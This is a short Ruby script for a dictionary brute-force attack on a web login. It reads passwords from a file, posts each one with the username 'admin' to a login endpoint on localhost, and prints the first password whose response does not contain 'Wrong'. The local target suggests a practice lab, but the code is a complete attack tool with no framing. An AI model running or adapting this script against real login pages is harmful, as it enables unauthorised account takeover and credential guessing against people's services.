require 'net/http'
require 'uri'

def wrong?(line)
  uri = URI('http://localhost:4567/login')
  response_html = Net::HTTP.post_form(uri, :username => "admin", :password  => line).body
  response_html.include?"Wrong"
end

input = File.open "passwords.txt", "r"
while (line = input.gets)
  line.strip!
  if wrong?(line) == false
    puts "password is #{line}"
    input.close
    exit
  end
end
